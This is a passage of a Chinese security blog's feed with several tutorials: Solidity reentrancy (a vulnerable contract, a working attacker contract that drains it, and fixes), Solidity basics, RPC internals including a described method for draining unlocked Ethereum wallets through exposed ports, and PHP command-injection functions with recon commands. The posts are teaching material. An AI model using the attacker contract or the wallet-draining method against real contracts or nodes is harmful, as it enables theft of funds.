href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">rebinder </a>测试 <strong>DNS</strong> 重绑定漏洞，该工具可以让一个域名随机绑定俩个IP。本地测试如下：</p><p><img src="/image/DNS-Rebinding/2.png" alt="2"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-概念&quot;&gt;&lt;a href=&quot;#0x01-概念&quot; class=&quot;headerlink&quot; title=&quot;0x01 概念&quot;&gt;&lt;/a&gt;0x01 概念&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt; 重绑定是 &lt;strong&gt;SSRF&lt;/strong&gt; 一种</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="DNS" scheme="https://banana69.site/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>浅入理解重入漏洞（Re-Entrance）</title>
    <link href="https://banana69.site/2021/09/30/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://banana69.site/2021/09/30/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-09-30T07:34:10.000Z</published>
    <updated>2021-10-17T12:15:55.500Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h4><p>重入漏洞可以理解为递归调用漏洞。在以太坊智能合约中，调用外部合约或将Ether发送到其他地址的操作需要合约提交外部调用，这些外部调用可能被攻击者劫持，迫使合约执行其他代码，导致重新进入逻辑。例如从账户提现时，提现后系统对余额没有立即更新，导致可以循环利用不停提现，直至消耗完合约内部的余额。</p><p>这里首先需要了解以太坊中的几种转币方式和 fallback() 函数：</p><p><strong>(1) 转币方式</strong></p><p>在<strong>Solidity</strong>中<code>&lt;address&gt;.transfer()</code>，<code>&lt;address&gt;.send()</code> 和 <code>&lt;address&gt;.gas().call.vale()()</code> 都可以用于向某一地址发送 ether，他们的区别在于：</p><ul><li><p><strong><address>.transfer()</strong></p><p>当发送失败后会回滚到之前的状态，并且只传递 <strong>2300 Gas</strong>供调用，可以防止重入。</p></li><li><p><strong><address>.send()</strong></p><p>当发送失败后会返回 <strong>false</strong>，只会传递 <strong>2300 Gas</strong>供调用，可以防止重入。</p><blockquote><p>有部分早期的智能合约使用send()转币时会忽略掉其返回值，致使转币失败后后续的代码也可以继续执行。</p></blockquote></li><li><p><strong><address>.gas().call.value()()</strong></p><p>当发送失败后会返回<strong>false</strong>，但是会传递所有可用的 <strong>Gas</strong> 供调用，虽然可以对gas(gas_value)进行限制，但是不能有效防止重入。</p></li></ul><p><strong>(2) fallback() 函数</strong></p><p>智能合约中可以唯一存在一个未命名的函数，称为回退(<strong>fallback</strong>)函数，该函数不能有实参，不能有返回任何值。执行回退函数需要几个条件：</p><ul><li>当外部账户或其他合约向该合约地址发送<strong>Ether</strong>时，回退函数会被调用。</li><li>当外部账户或其他合约向该合约地址发送<strong>Ether</strong>，但是内部没有回退函数时会抛出异常，然后此次交易将会被取消，<strong>Ether</strong>也会被退还。</li><li>当外部账户或其他合约调用了一个该合约中不存在的函数时，回退函数将会被调用。</li></ul><p>(3) <strong>payable</strong> 修饰符</p><p>在函数上增加payable修饰符时，表示该函数可以接受 <strong>Ether</strong>，并且会把接收的 <strong>Ether</strong> 存储在当前的合约中。</p><h4 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"> </span><br><span class="line">contract Victim &#123;</span><br><span class="line">    mapping(address =&gt; uint) public userBalannce;</span><br><span class="line">    uint public amount = 0;</span><br><span class="line">    function Victim() payable&#123;&#125;</span><br><span class="line">    function withDraw()&#123;</span><br><span class="line">        uint amount = userBalannce[msg.sender];</span><br><span class="line">        if(amount &gt; 0)&#123;</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">            userBalannce[msg.sender] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function() payable&#123;&#125;</span><br><span class="line">    function receiveEther() payable&#123;</span><br><span class="line">        if(msg.value &gt; 0)&#123;</span><br><span class="line">            userBalannce[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function showAccount() public returns (uint)&#123;</span><br><span class="line">        amount = this.balance;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码实现了一个类似银行的功能，可以存入或取出 <strong>Ether</strong>，但存在重入漏洞。这里转币时使用<code>call.value()()</code>的方式，该函数会将剩余的 <strong>Gas</strong> 全部用于外部调用（fallback() 函数），所以当进行交易时若目标地址为一个合约地址则会默认调用该函数的 <strong>fallback</strong> 函数。</p><p>从以上合约的代码中可以看出，在执行<code> msg.sender.call.value(_amount)();</code>向目标地址发送 <strong>Ether</strong> 存在一个递归问题，并未执行下一步的减币操作，因此存在重入漏洞。</p><p>重入漏洞存在的条件：</p><ul><li><p>合约调用有足够的 <strong>Gas</strong></p></li><li><p>具有转账功能（<strong>payable</strong> 修饰符）</p></li><li><p>状态变量在重入函数调用之后</p></li></ul><p>攻击者合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attacker&#123;</span><br><span class="line">    uint public amount = 0;</span><br><span class="line">    uint public test = 0;</span><br><span class="line">    function Attacker() payable&#123;&#125;</span><br><span class="line">    function() payable&#123;</span><br><span class="line">        test++;</span><br><span class="line">        Victim(msg.sender).withDraw();</span><br><span class="line">    &#125;</span><br><span class="line">    function showAccount() public returns (uint)&#123;</span><br><span class="line">        amount = this.balance;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line">    function sendMoney(address addr)&#123;</span><br><span class="line">        Victim(addr).receiveEther.value(1 ether)();</span><br><span class="line">    &#125;</span><br><span class="line">    function reentry(address addr)&#123;</span><br><span class="line">        Victim(addr).withDraw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行步骤：</p><ol><li>攻击者合约向受害者合约存入1个 <strong>Ether</strong></li><li>攻击者合约从受害者合约取出存入的 <strong>Ether</strong>，攻击者合约地址收到 <strong>Ether</strong> 时未指定其他有效函数，会默认调用 <strong>fallback</strong> 函数</li><li>执行攻击者合于中的 <strong>fallback</strong> 函数，不断循环给攻击者合约转币。</li></ol><h4 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><ol><li><p>首先将以上俩个合约写到一个文件中并分别部署到区块链上，如下图所示，使用 <strong>JavaScript VM</strong>环境。</p><blockquote><p>注意：在部署合约时需要设置 <strong>Value</strong>，这里设置为20 <strong>Ether</strong>.</p></blockquote><p><img src="/image/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p></li><li><p>使用攻击合约向存在漏洞的合约存入<strong>1 Ether</strong>。</p><p><img src="/image/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/2.png" alt="2"></p></li><li><p>此时在受害者合约中可以查看到攻击者已经存入<strong>1 Ether</strong>。</p><p><img src="/image/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/3.png" alt="3"></p></li><li><p>在攻击者合约中进行攻击。</p><blockquote><p>此时攻击者合约会调用受害者合约中的 <strong>withdraw()</strong> 函数，从受害者合约中取出币后发送到攻击者合约，但因攻击者合约收到币后并未执行相应操作，所以会执行 <strong>fallback()</strong> 函数，即会递归调用 <strong>withdraw()</strong> 函数，造成重入攻击。</p></blockquote><p><img src="/image/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/4.png" alt="4"></p><p>在攻击结束后查看攻击者账户，已经将受害者账户中的全部 <strong>Ether</strong> 取出。</p></li></ol><h4 id="0x03-缓解措施"><a href="#0x03-缓解措施" class="headerlink" title="0x03 缓解措施"></a>0x03 缓解措施</h4><p>可以设计更加规范的代码范来规避重入漏洞，例如：</p><ul><li><p>将金额更新代码放至合理的位置，使账户金额先更新再调用；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withDraw()&#123;</span><br><span class="line">        uint amount = userBalannce[msg.sender];</span><br><span class="line">        userBalances[msg.sender] = 0 //先进行更新</span><br><span class="line">        if(amount &gt; 0)&#123;</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">            userBalannce[msg.sender] = 0;</span><br></pre></td></tr></table></figure></li><li><p>尽可能使用 <strong>Solididy</strong> 的内置函数 <strong>transfer()</strong> 将 <strong>Ether</strong> 发送给外部合约，在转账时只发送 <strong>2300 Gas</strong>，无法调用其他合约；</p></li><li><p>确保状态变量的更新发生在 <strong>Ether</strong> 被发送或者任何外部合约调用之前，即使用<code>检查 - 生效 - 交互</code>模式；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;//检查</span><br><span class="line">       balances[msg.sender] -= _amount;//生效</span><br><span class="line">       msg.sender.transfer(_amount);//交互</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p>转换发送模式为提款模式，使收款方控制 <strong>Ether</strong> 的转移，减少其他逻辑和提款逻辑的耦合；</p></li><li><p>添加状态变量使其在代码执行时锁定合约，防止重入调用；</p></li><li><p>明确 <strong>transfer</strong>、<strong>send</strong>、<strong>call</strong> 的区别，防范对 <strong>Gas</strong> 的滥用。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-漏洞原理&quot;&gt;&lt;a href=&quot;#0x01-漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞原理&quot;&gt;&lt;/a&gt;0x01 漏洞原理&lt;/h4&gt;&lt;p&gt;重入漏洞可以理解为递归调用漏洞。在以太坊智能合约中，调用外部合约或将Ether发送到</summary>
      
    
    
    
    <category term="智能合约" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>初识Solididy合约结构</title>
    <link href="https://banana69.site/2021/09/22/%E5%88%9D%E8%AF%86Solididy/"/>
    <id>https://banana69.site/2021/09/22/%E5%88%9D%E8%AF%86Solididy/</id>
    <published>2021-09-22T01:24:02.000Z</published>
    <updated>2021-10-06T06:22:33.545Z</updated>
    
    <content type="html"><![CDATA[<p>在<strong>Solidity</strong>中，合约类似于面向对象编程语言中的类。每个合约都可以包含状态变量、函数、函数修饰器、事件、结构类型和枚举类型的声明，且合约可以从其他合约继承。</p><h4 id="0x01-状态变量"><a href="#0x01-状态变量" class="headerlink" title="0x01 状态变量"></a>0x01 状态变量</h4><p>状态变量是永久地存储在合约存储中的值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract SimpleStorage&#123;</span><br><span class="line">uint storedData; //状态变量</span><br><span class="line"> // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x02-函数"><a href="#0x02-函数" class="headerlink" title="0x02 函数"></a>0x02 函数</h4><p>函数是合约中代码的可执行单元。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    function bid() public payable &#123; // 函数</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数调用可发生在合约内部或外部，且函数对其他合约有不同成都的可见性。</p><h4 id="0x03-函数修饰器"><a href="#0x03-函数修饰器" class="headerlink" title="0x03 函数修饰器"></a>0x03 函数修饰器</h4><p>函数修饰器可以用来以声明的方式改良函数语义。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.22;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    address public seller;</span><br><span class="line"></span><br><span class="line">    modifier onlySeller() &#123; // 修饰器</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == seller,</span><br><span class="line">            &quot;Only seller can call this.&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function abort() public onlySeller &#123; // Modifier usage</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x05-事件"><a href="#0x05-事件" class="headerlink" title="0x05 事件"></a>0x05 事件</h4><p>事件能方便地调用以太坊虚拟机日志功能的接口。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    event HighestBidIncreased(address bidder, uint amount); // 事件</span><br><span class="line"></span><br><span class="line">    function bid() public payable &#123;</span><br><span class="line">        // ...</span><br><span class="line">        emit HighestBidIncreased(msg.sender, msg.value); // 触发事件</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x06-结构类型"><a href="#0x06-结构类型" class="headerlink" title="0x06 结构类型"></a>0x06 结构类型</h4><p>结构是可以将几个变量分组的自定义类型。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Ballot &#123;</span><br><span class="line">    struct Voter &#123; // 结构</span><br><span class="line">        uint weight;</span><br><span class="line">        bool voted;</span><br><span class="line">        address delegate;</span><br><span class="line">        uint vote;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x07-枚举类型"><a href="#0x07-枚举类型" class="headerlink" title="0x07 枚举类型"></a>0x07 枚举类型</h4><p>枚举可用来创建由一定数量的”常量值”构成的自定义类型。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    enum State &#123; Created, Locked, Inactive &#125; // 枚举</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在&lt;strong&gt;Solidity&lt;/strong&gt;中，合约类似于面向对象编程语言中的类。每个合约都可以包含状态变量、函数、函数修饰器、事件、结构类型和枚举类型的声明，且合约可以从其他合约继承。&lt;/p&gt;
&lt;h4 id=&quot;0x01-状态变量&quot;&gt;&lt;a href=&quot;#0x01-状</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>远程过程调用RPC</title>
    <link href="https://banana69.site/2021/09/16/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8RPC/"/>
    <id>https://banana69.site/2021/09/16/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8RPC/</id>
    <published>2021-09-16T14:34:44.000Z</published>
    <updated>2021-10-06T06:22:14.125Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-概念介绍"><a href="#0x01-概念介绍" class="headerlink" title="0x01 概念介绍"></a>0x01 概念介绍</h4><p><strong>RPC</strong>即远程过程调用<strong>（Remote Procedure Call）</strong>。如下图所示，<strong>RPC</strong>指在计算机<strong>A</strong>上的进程掉用另外一台计算机<strong>B</strong>上的进程，<strong>A</strong>上的进程被挂起时，<strong>B</strong>上被调用的进程开始执行，当值返回给<strong>A</strong>时，<strong>A</strong>进程继续执行，调用方可以通过使用参数将信息传送给被调用方，然后通过传回的结果得到信息。<img src="/image/RPC/1.png" alt="1">)</p><blockquote><p>client stub：存放服务端的地址信息，将客户端的请求参数打包成网络数据后通过网络远程发送给服务方。</p><p>server stub：接受客户端发送过来的消息，将消息解包，并调用本地的方法。</p></blockquote><p>远程过程调用采用<strong>Client/Server</strong>模式。请求程序就是一个<strong>Client</strong>，服务提供程序即为服务器。远程过程调用是同步操作，这一点与本地过程调用类似，在远程过程结果返回之前，需要暂时中止请求程序。<strong>使用相同地址空间的低权进程或低权线程允许同时运行多个远程过程调用。</strong></p><p>整个<strong>RPC</strong>的过程可以理解为以下步骤：</p><ol><li><strong>Client</strong>调用进程发送一个带有进程参数的调用信息到服务进程，然后等待应答信息。</li><li><strong>Server</strong>处于等待状态知道调用信息到达，当调用信息到达后，服务器获得参数，计算结果并发送回复信息并等待下一个信息到来。</li><li><strong>Client</strong>接受到答复信息，获取回复结果并继续执行。</li></ol><h4 id="0x02-实现原理"><a href="#0x02-实现原理" class="headerlink" title="0x02 实现原理"></a>0x02 实现原理</h4><p>首先理解本地过程调用的实现，以下面C语言的调用为例：</p><p><code>count = read(fd, buf, nbytes);</code></p><p>以上代码中，<strong>fd</strong>为整数型，表示一个文件；<strong>buf</strong>为一个字符数组，用于存储读入的数据；<strong>nbytes</strong>为另一个整数型，用于记录实际读入的字节数。如果该调用位于主程序中，那么在调用之前堆栈的状态如下图所示。</p><p><img src="/image/RPC/2.png" alt="2"></p><p>为了进行调用，调用方首先把参数反序压入堆栈，即为最后一个参数先压入，如下图所示。在<strong>read</strong>函数运行完成后，它将返回值放入某个寄存器中，移出返回地址，并将控制权交回给调用方，然后调用方将参数从堆栈中移出，使堆栈还原到初始的状态。</p><p><img src="/image/RPC/3.png" alt="3"></p><p><strong>RPC</strong>的思想是尽量使远程过程调用具有域本地调用相同的形式，假设程序需要从某个文件读取数据，通过调用<strong>read</strong>函数来获取数据。在传统的系统中，read由链接器从库中提取出来，然后链接器再将它插入目标程序中。<strong>read</strong>过程是一个短过程，一般通过执行一个等效的<strong>read</strong>系统调用来实现，<strong>read</strong>过程是一个位于童虎代码和本地操作系统之间的接口。虽然<strong>read</strong>执行了系统调用，但是它本身依然是通过将参数压入堆栈的常规方式调用的。</p><p><strong>RPC</strong> 是通过类似的途径来获得透明性。当 <strong>read</strong> 实际上是一个远程过程时（比如在文件服务器所在的机器上运行的过程），库中就放入 <strong>read</strong> 的另外一个版本，称为客户存根<strong>（client stub）</strong>。这种版本的 <strong>read</strong> 过程同样遵循上图的调用次序，这点与原来的 <strong>read</strong> 过程相同。另一个相同点是其中也执行了本地操作系统调用。唯一不同点是它不要求操作系统提供数据，而是将参数打包成消息，而后请求此消息发送到服务器，如下图所示。在对 <strong>send</strong> 的调用后，客户存根调用 <strong>receive</strong> 过程，随即阻塞自己，直到收到响应消息。</p><p><img src="/image/RPC/4.png" alt="4"></p><p>当消息到达服务器时，服务器上的操作系统将它传递给服务器存根<strong>（server stub）</strong>。服务器存根一般先调用 <strong>receive</strong> ，然后被阻塞，等待消息输入。收到消息后，服务器将参数由消息中提取出来，然后以常规方式调用服务器上的相应过程。调用完后，服务器存根要将控制权教会给客户发出调用的过程，它将结果（缓冲区）打包成消息，随后调用 <strong>send</strong> 将结果返回给客户。然后服务器存根一般会再次调用 <strong>receive</strong>，等待下一个输入的请求。</p><p>客户机器接收到消息后，客户操作系统发现该消息属于某个客户进程（实际上该进程是客户存根，只是操作系统无法区分二者）。操作系统将消息复制到相应的缓存区中，随后解除对客户进程的阻塞。客户存根检查该消息，将结果提取出来并复制给调用者，而后以通常的方式返回。当调用者在 <strong>read</strong> 调用进行完毕后重新获得控制权时只能得到所需的数据，无法确认操作是在本地操作系统进行，还是远程完成。</p><p>概况来说，远程过程调用包含如下步骤：</p><ul><li>客户过程以正常的方式调用客户存根；</li><li>客户存根生成一个消息，然后调用本地操作系统；</li><li>客户端操作系统将消息发送给远程操作系统；</li><li>远程操作系统将消息交给服务器存根；</li><li>服务器存根调将参数提取出来，而后调用服务器；</li><li>服务器执行要求的操作，操作完成后将结果返回给服务器存根；</li><li>服务器存根将结果打包成一个消息，而后调用本地操作系统；</li><li>服务器操作系统将含有结果的消息发送给客户端操作系统；</li><li>客户端操作系统将消息交给客户存根；</li><li>客户存根将结果从消息中提取出来，返回给调用它的客户存根。</li></ul><h4 id="0x03-产生原因"><a href="#0x03-产生原因" class="headerlink" title="0x03 产生原因"></a>0x03 产生原因</h4><p><strong>RPC</strong>主要解决俩个问题</p><blockquote><ol><li><strong>解决分布式系统中，服务之间的调用问题。</strong></li><li><strong>远程调用时，要能够像本地调用一样方便，让调用者感知不到远程调用的逻辑。</strong></li></ol></blockquote><h4 id="0x04-过程实现"><a href="#0x04-过程实现" class="headerlink" title="0x04 过程实现"></a>0x04 过程实现</h4><ul><li><p>传递值参数</p><p>使用RPC进行远程计算，其中，远程过程add(i,j)有俩个参数i和j，其结果是返回i和j的算数和。<img src="/image/RPC/5.png" alt="5"></p><p>通过 <strong>RPC</strong> 进行远程计算步骤：</p><ol><li>将参数放入消息中，并在消息中添加要调用的过程的名称或者编码。</li><li>消息到达服务器后，服务器存根堆该消息进行分析，以判明需要调用哪个过程，随后执行相应的调用。</li><li>服务器运行完毕后，服务器存根将服务器得到的结果打包成消息送回客户存根，客户存根将结果从消息中提取出来，把结果值返回给客户端。</li></ol></li></ul><ul><li><p>传递引用参数</p><p>传递引用参数相对来说比较困难。单纯传递参数的引用（也包含指针）是完全没有意义的，因为引用地址传递给远程计算机,其指向的内存位置可能跟远程系统上完全不同。如果想支持传递引用参数,必须发送参数的副本,将它们放置在远程系统内存中，向他们传递一个指向服务器函数的指针，然后将对象发送回客户端，复制它的引用。如果远程过程调用必须支持引用复杂的结构，比如树和链表，他们需要将结构复制到一个无指针的表示里面（比如，一个扁平的树)，并传输到在远程端来重建数据结构。</p></li></ul><h4 id="0x05-RPC漏洞"><a href="#0x05-RPC漏洞" class="headerlink" title="0x05 RPC漏洞"></a>0x05 RPC漏洞</h4><p>微软的一些<strong>RPC</strong>漏洞，通过畸形的<strong>RPC</strong>请求，触发<strong>C/C++<strong>的字符串拷贝连接之类的问题，造成内存覆盖，引发安全漏洞。如</strong>MS08067</strong>。</p><p>区块链中也存在<strong>RPC</strong>相关的漏洞，如<strong>RPC</strong>设计引发的逻辑类盗币漏洞</p><ul><li><p>以太坊对于账户的<strong>RPC</strong>调用支持<strong>unlockaccount api</strong></p><p>在调用<strong>unlockaccount api</strong>时，需要提供地址，密码和解锁时间。一旦解锁时间，该钱包若还暴露在公网上，在<strong>duration</strong>期间的钱包，任何人在<strong>duration</strong>这段期间都有权限将钱包中的eth转走。</p><p>整个攻击流程如下：攻击者预先扫描 <strong>8545</strong> 端口（<strong>HTTP JSON RPC API）</strong>、<strong>8546</strong> 端口（<strong>WebSocket JSON RPC API）</strong>等开放的以太坊节点，遍历区块高度、钱包地址及余额，一旦有余额的地址处于<strong>unlock duration</strong>，重复调用 <strong>eth_sendTransaction</strong> 将余额转空。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-概念介绍&quot;&gt;&lt;a href=&quot;#0x01-概念介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 概念介绍&quot;&gt;&lt;/a&gt;0x01 概念介绍&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;RPC&lt;/strong&gt;即远程过程调用&lt;strong&gt;（Remote</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="RPC" scheme="https://banana69.site/tags/RPC/"/>
    
  </entry>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="https://banana69.site/2020/09/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://banana69.site/2020/09/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-19T05:04:31.000Z</published>
    <updated>2021-10-17T12:18:18.171Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-命令执行漏洞介绍"><a href="#0x01-命令执行漏洞介绍" class="headerlink" title="0x01 命令执行漏洞介绍"></a>0x01 命令执行漏洞介绍</h4><p><img src="/image/os-injection/1.png" alt="1"></p><p>命令注入指应用程序的某些功能调用了可以执行系统命令的函数，攻击者控制函数或者函数的参数就可能通过命令连接符将恶意命令拼接到正常的函数中，从而随意执行系统命令。</p><ul><li><p><strong>system函数</strong></p><p><strong>system</strong>函数用于执行外部程序，并且显示输出，用法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> system(<span class="keyword">string</span> <span class="variable">$command</span>[, <span class="keyword">int</span> &amp;<span class="variable">$return_va</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>exec函数</strong></p><p><strong>exec</strong>函数用于执行一个外部程序，用法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> exec(<span class="keyword">string</span> <span class="variable">$command</span>[, <span class="keyword">array</span> &amp;<span class="variable">$output</span>[, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span>]])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> exec(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span> <span class="comment">//该代码需要使用echo函数才能输出结果</span></span><br></pre></td></tr></table></figure></li><li><p><strong>shell_exec函数</strong></p><p><strong>shell_exec</strong>函数通过<strong>shell</strong>环境执行命令，并且将完整的输出以字符串的方式返回，其用法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> shell_exec(<span class="keyword">string</span> <span class="variable">$cmd</span>)</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> shell_exec(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span> <span class="comment">//该代码需要使用echo函数才能输出结果</span></span><br></pre></td></tr></table></figure></li><li><p><strong>passthru函数</strong></p><p><strong>passthru</strong>函数用于执行外部程序并且显示原始输出，其用法如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> passthru(<span class="keyword">string</span> <span class="variable">$command</span>[, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span>])</span><br><span class="line"><span class="meta">&lt;?php</span> passthru(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>popen函数</strong></p><p><strong>popen</strong>函数用于打开进程文件指针，其用法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">resource popen(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">string</span> <span class="variable">$mode</span>)</span><br><span class="line"><span class="meta">&lt;?php</span> popen(<span class="string">&quot;touch 1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="meta">?&gt;</span> <span class="comment">//执行后会在当前文件夹创建1.txt</span></span><br></pre></td></tr></table></figure></li><li><p><strong>proc_open函数</strong></p><p><strong>proc_open</strong>函数用于执行一个命令，并且打开用来输入输出的文件指针，其用法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$proc</span> = proc_open(<span class="string">&quot;whoami&quot;</span>,</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;W&quot;</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipr&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">),</span><br><span class="line"><span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">print</span> steam_get_contents(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>反单引号</strong></p><p><strong>`<strong>是</strong>PHP</strong>执行运算符，<strong>PHP</strong>尝试将反单引号中的内容作为<strong>shell</strong>命令来执行，并将其输入信息返回。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h4><table><thead><tr><th align="center">Purpose of command</th><th align="center">Linux</th><th align="center">Windows</th></tr></thead><tbody><tr><td align="center">当前用户</td><td align="center"><code>whoami</code></td><td align="center"><code>whoami</code></td></tr><tr><td align="center">操作系统</td><td align="center"><code>uname -a</code></td><td align="center"><code>ver</code></td></tr><tr><td align="center">网络配置</td><td align="center"><code>ifconfig</code></td><td align="center"><code>ipconfig /all</code></td></tr><tr><td align="center">网络连接</td><td align="center"><code>netstat -an</code></td><td align="center"><code>netstat -an</code></td></tr><tr><td align="center">运行进程</td><td align="center"><code>ps -ef</code></td><td align="center"><code>tasklist</code></td></tr></tbody></table><h5 id="通过时间延迟检测盲操作系统命令注入"><a href="#通过时间延迟检测盲操作系统命令注入" class="headerlink" 